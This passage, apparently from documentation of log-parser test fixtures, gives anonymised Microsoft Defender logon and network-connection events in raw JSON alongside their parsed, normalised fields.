-SpecialSession\",\"InitiatingProcessAccountName\":\"system\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessTokenElevation\":\"None\",\"InitiatingProcessIntegrityLevel\":null,\"InitiatingProcessParentId\":12776,\"InitiatingProcessParentCreationTime\":\"2023-01-04T13:25:35.9028371Z\",\"InitiatingProcessParentFileName\":\"\\\\Device\\\\HarddiskVolume3\\\\Windows\\\\System32\\\\smss.exe\",\"AdditionalFields\":\"{\\\"IsLocalLogon\\\":true}\",\"RemoteIPType\":null,\"IsLocalAdmin\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"Protocol\":\"Negotiate\",\"FailureReason\":null,\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "authentication"
            ],
            "dataset": "device_logon_events",
            "outcome": "success",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-01-04T13:25:36.193699Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "S-1-1-11-1-1",
                "InitiatingProcessCommandLine": "WinLogon.exe -SpecialSession",
                "LogonId": "111111",
                "LogonType": "Interactive"
            },
            "type": "LogonSuccess"
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940"
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "21833"
                }
            }
        },
        "process": {
            "args": [
                "-SpecialSession"
            ],
            "command_line": "WinLogon.exe -SpecialSession",
            "executable": "C:\\Windows\\System32",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            },
            "name": "winlogon.exe",
            "parent": {
                "name": "smss.exe",
                "pid": 12776,
                "start": "2023-01-04T13:25:35.902837Z"
            },
            "pid": 3660,
            "start": "2023-01-04T13:25:35.987706Z",
            "user": {
                "domain": "example.com",
                "id": "user1",
                "name": "system"
            },
            "working_directory": "C:\\Windows"
        },
        "related": {
            "hash": [
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "user": [
                "user1"
            ]
        },
        "user": {
            "domain": "example.com",
            "name": "user1"
        }
    }
    	
	```


=== "test_device_logon_failed.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-11-18T10:08:29.9147832Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceLogonEvents\",\"_TimeReceivedBySvc\":\"2024-11-18T10:07:35.3397350Z\",\"properties\":{\"AccountName\":\"user1\",\"AccountDomain\":\"example.com\",\"LogonType\":\"Network\",\"DeviceName\":\"example.com\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"ReportId\":413706,\"AccountSid\":null,\"AppGuardContainerId\":null,\"LogonId\":null,\"RemoteIP\":\"1.1.1.1\",\"RemotePort\":null,\"RemoteDeviceName\":null,\"ActionType\":\"LogonFailed\",\"InitiatingProcessId\":3653343,\"InitiatingProcessCreationTime\":\"2024-11-18T10:07:20.29393Z\",\"InitiatingProcessFileName\":\"sshd\",\"InitiatingProcessFolderPath\":\"/usr/sbin/sshd\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessCommandLine\":\"/usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,user@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa -R\",\"InitiatingProcessAccountName\":\"root\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":null,\"InitiatingProcessTokenElevation\":\"None\",\"InitiatingProcessIntegrityLevel\":null,\"InitiatingProcessParentId\":3653343,\"InitiatingProcessParentCreationTime\":\"2024-11-18T10:07:20.29Z\",\"InitiatingProcessParentFileName\":\"sshd\",\"AdditionalFields\":\"{\\\"PosixUserId\\\":1301,\\\"PosixPrimaryGroupName\\\":\\\"account\\\",\\\"PosixPrimaryGroupId\\\":500,\\\"PosixSecondaryGroups\\\":\\\"[{\\\\\\\"Name\\\\\\\":\\\\\\\"users\\\\\\\",\\\\\\\"PosixGroupId\\\\\\\":100},{\\\\\\\"Name\\\\\\\":\\\\\\\"exploitation\\\\\\\",\\\\\\\"PosixGroupId\\\\\\\":1202}]\\\",\\\"InitiatingAccountName\\\":\\\"root\\\",\\\"InitiatingAccountDomain\\\":\\\"domain\\\",\\\"InitiatingAccountPosixUserId\\\":0,\\\"InitiatingAccountPosixGroupName\\\":\\\"mdatp\\\",\\\"InitiatingAccountPosixGroupId\\\":595}\",\"RemoteIPType\":\"Private\",\"IsLocalAdmin\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"Protocol\":null,\"FailureReason\":null,\"InitiatingProcessFileSize\":890528,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-11-18T10:07:22.681617Z\",\"MachineGroup\":\"Linux Servers - remediate threats automatically\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "authentication"
            ],
            "dataset": "device_logon_events",
            "outcome": "failure",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-11-18T10:07:22.681617Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessCommandLine": "/usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,user@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa -R",
                "InitiatingProcessFileSize": 890528,
                "IsInitiatingProcessRemoteSession": "false",
                "LogonType": "Network",
                "RemoteIPType": "Private"
            },
            "type": "LogonFailed"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "413706"
                }
            }
        },
        "process": {
            "args": [
                "-D",
                "-R",
                "-oCASignatureAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa",
                "-oCiphers=aes256-gcm@openssh.com,user@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc",
                "-oGSSAPIKexAlgorithms=gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1-",
                "-oHostKeyAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com",
                "-oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1",
                "-oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512",
                "-oPubkeyAcceptedKeyTypes=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com"
            ],
            "command_line": "/usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,user@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa -R",
            "executable": "/usr/sbin/sshd",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "sshd",
            "parent": {
                "name": "sshd",
                "pid": 3653343,
                "start": "2024-11-18T10:07:20.290000Z"
            },
            "pid": 3653343,
            "start": "2024-11-18T10:07:20.293930Z",
            "user": {
                "domain": "example.com",
                "name": "root"
            },
            "working_directory": "/usr/sbin"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1"
            ],
            "user": [
                "user1"
            ]
        },
        "user": {
            "domain": "example.com",
            "name": "user1"
        }
    }
    	
	```


=== "test_device_network_connection.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-09-30T14:02:12.4790551Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkEvents\",\"_TimeReceivedBySvc\":\"2024-09-30T14:01:00.5234998Z\",\"properties\":{\"DeviceName\":\"example.com\",\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"ReportId\":21118,\"RemoteIP\":\"1.1.1.1\",\"RemotePort\":57410,\"LocalIP\":\"2.2.2.2\",\"LocalPort\":7680,\"Protocol\":\"TcpV4\",\"RemoteUrl\":null,\"InitiatingProcessCreationTime\":null,\"InitiatingProcessId\":0,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessParentId\":0,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":null,\"InitiatingProcessAccountDomain\":null,\"InitiatingProcessAccountSid\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessIntegrityLevel\":null,\"InitiatingProcessTokenElevation\":\"None\",\"AppGuardContainerId\":\"\",\"LocalIPType\":null,\"RemoteIPType\":null,\"ActionType\":\"ConnectionAttempt\",\"InitiatingProcessSHA256\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AdditionalFields\":\"{\\\"direction\\\":\\\"In\\\",\\\"Source Mac\\\":\\\"02:00:00:00:00:01\\\",\\\"Destination Mac\\\":\\\"02:00:00:00:00:02\\\",\\\"Tcp Flags\\\":2,\\\"Packet Size\\\":66}\",\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-09-30T14:00:41.9341182Z\",\"MachineGroup\":\"Windows 10/11 - remediate threats automatically\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "device_network_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-09-30T14:00:41.934118Z",
        "action": {
            "name": "Publish",
            "properties": {
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "ConnectionAttempt"
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2",
            "mac": "02:00:00:00:00:01",
            "port": 7680
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "21118"
                }
            }
        },
        "network": {
            "protocol": "TcpV4"
        },
        "process": {
            "parent": {
                "pid": 0
            },
            "pid": 0
        },
        "related": {
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "mac": "02:00:00:00:00:02",
            "port": 57410
        }
    }
    	
	```


=== "test_device_network_events.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-01-04T14:07:32.6213639Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkEvents\",\"properties\":{\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"DeviceName\":\"example.com\",\"ReportId\":37827,\"Timestamp\":\"2023-01-04T14:05:32.3148625Z\",\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":443,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":59985,\"Protocol\":\"Tcp\",\"RemoteUrl\":\"www.example.org\",\"InitiatingProcessCreationTime\":\"2023-01-04T14:05:22.8079798Z\",\"InitiatingProcessId\":18288,\"InitiatingProcessCommandLine\":\"ANONYMIZED\",\"InitiatingProcessParentCreationTime\":\"2023-01-04T14:04:35.708037Z\",\"InitiatingProcessParentId\":23332,\"InitiatingProcessParentFileName\":\"explorer.exe\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFolderPath\":\"c:\\\\program files\\\\microsoft office\\\\root\\\\office16\\\\excel.exe\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessFileName\":\"EXCEL.EXE\",\"InitiatingProcessIntegrityLevel\":\"Medium\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"AppGuardContainerId\":\"\",\"LocalIPType\":\"Private\",\"RemoteIPType\":\"Public\",\"ActionType\":\"ConnectionSuccess\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessAccountUpn\":\"john.doe@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"AdditionalFields\":null,\"InitiatingProcessFileSize\":63984520,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft Office\",\"InitiatingProcessVersionInfoProductVersion\":\"16.0.15601.20538\",\"InitiatingProcessVersionInfoInternalFileName\":\"Excel\",\"InitiatingProcessVersionInfoOriginalFileName\":\"Excel.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Microsoft Excel\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "device_network_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-01-04T14:05:32.314862Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "ANONYMIZED",
                "InitiatingProcessFileSize": 63984520,
                "InitiatingProcessIntegrityLevel": "Medium",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Microsoft Excel",
                "InitiatingProcessVersionInfoInternalFileName": "Excel",
                "InitiatingProcessVersionInfoOriginalFileName": "Excel.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft Office",
                "InitiatingProcessVersionInfoProductVersion": "16.0.15601.20538",
                "LocalIPType": "Private",
                "RemoteIPType": "Public"
            },
            "type": "ConnectionSuccess"
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2",
            "port": 443
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "37827"
                }
            }
        },
        "network": {
            "protocol": "Tcp"
        },
        "process": {
            "command_line": "ANONYMIZED",
            "executable": "c:\\program files\\microsoft office\\root\\office16\\excel.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "EXCEL.EXE",
            "parent": {
                "name": "explorer.exe",
                "pid": 23332,
                "start": "2023-01-04T14:04:35.708037Z"
            },
            "pid": 18288,
            "start": "2023-01-04T14:05:22.807979Z",
            "user": {
                "domain": "example.com",
                "email": "john.doe@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\program files\\microsoft office\\root\\office16"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "hosts": [
                "www.example.org"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "port": 59985
        },
        "url": {
            "domain": "www.example.org",
            "registered_domain": "example.org",
            "subdomain": "www",
            "top_level_domain": "org"
        }
    }
    	
	```


=== "test_device_network_events_2.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-08-27T13:54:31.4739638Z\",\"tenantId\":\"22222222-2222-2222-2222-222222222222\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkEvents\",\"_TimeReceivedBySvc\":\"2025-08-27T13:53:29.5220061Z\",\"properties\":{\"DeviceName\":\"example.com\",\"DeviceId\":\"111111111111111111111111111111111111111\",\"ReportId\":106822,\"RemoteIP\":\"1.1.1.1\",\"RemotePort\":443,\"LocalIP\":\"2.2.2.2\",\"LocalPort\":52468,\"Protocol\":\"TcpV4\",\"RemoteUrl\":\"https://example.com/\",\"InitiatingProcessCreationTime\":\"2025-08-27T08:14:14.4928209Z\",\"InitiatingProcessId\":31404,\"InitiatingProcessCommandLine\":\"\\\"chrome.exe\\\" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --no-pre-read-main-dll --metrics-shmem-handle=2560,i,7182567781150524342,1134727304477683424,524288 --field-trial-handle=2408,i,10825731403441479940,17898034617995043179,262144 --variations-seed-version=20250826-180048.703000 --mojo-platform-channel-handle=2568 /prefetch:3\",\"InitiatingProcessParentCreationTime\":\"2025-08-27T08:14:11.2717451Z\",\"InitiatingProcessParentId\":23948,\"InitiatingProcessParentFileName\":\"chrome.exe\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFolderPath\":\"c:\\\\program files\\\\google\\\\chrome\\\\application\\\\chrome.exe\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":\"S-1-2-3-4\",\"InitiatingProcessFileName\":\"chrome.exe\",\"InitiatingProcessIntegrityLevel\":\"Medium\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"AppGuardContainerId\":\"\",\"LocalIPType\":null,\"RemoteIPType\":null,\"ActionType\":\"ConnectionSuccess\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessAccountUpn\":\"ANONYMIZED\",\"InitiatingProcessAccountObjectId\":\"11111111-1111-1111-1111-111111111111\",\"AdditionalFields\":\"{}\",\"InitiatingProcessFileSize\":3078808,\"InitiatingProcessVersionInfoCompanyName\":\"Google LLC\",\"InitiatingProcessVersionInfoProductName\":\"Google Chrome\",\"InitiatingProcessVersionInfoProductVersion\":\"139.0.7258.139\",\"InitiatingProcessVersionInfoInternalFileName\":\"chrome_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"chrome.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Google Chrome\",\"InitiatingProcessSessionId\":\"33333333-3333-3333-3333-333333333333\",\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"InitiatingProcessUniqueId\":\"1111111111111111\",\"Timestamp\":\"2025-08-27T13:53:05.0564948Z\",\"MachineGroup\":\"SMTH FRANCE\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "device_network_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-08-27T13:53:05.056494Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "11111111-1111-1111-1111-111111111111",
                "InitiatingProcessCommandLine": "\"chrome.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --no-pre-read-main-dll --metrics-shmem-handle=2560,i,7182567781150524342,1134727304477683424,524288 --field-trial-handle=2408,i,10825731403441479940,17898034617995043179,262144 --variations-seed-version=20250826-180048.703000 --mojo-platform-channel-handle=2568 /prefetch:3",
                "InitiatingProcessFileSize": 3078808,
                "InitiatingProcessIntegrityLevel": "Medium",
                "InitiatingProcessSessionId": "33333333-3333-3333-3333-333333333333",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
                "InitiatingProcessVersionInfoCompanyName": "Google LLC",
                "InitiatingProcessVersionInfoFileDescription": "Google Chrome",
                "InitiatingProcessVersionInfoInternalFileName": "chrome_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "chrome.exe",
                "InitiatingProcessVersionInfoProductName": "Google Chrome",
                "InitiatingProcessVersionInfoProductVersion": "139.0.7258.139",
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "ConnectionSuccess"
        },
